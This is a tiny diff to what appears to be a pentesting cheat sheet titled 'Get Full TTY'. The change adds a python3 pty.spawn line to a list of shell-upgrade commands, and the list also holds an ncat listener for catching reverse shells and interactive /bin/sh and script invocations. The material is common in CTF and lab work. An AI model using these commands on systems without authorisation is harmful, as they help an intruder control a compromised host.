@@ -1,6 +1,7 @@
 ~~~Get Full TTY~~~
 
 python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 rlwrap ncat -lvp port
 /usr/bin/script -qc /bin/bash /dev/null
 /bin/sh -i
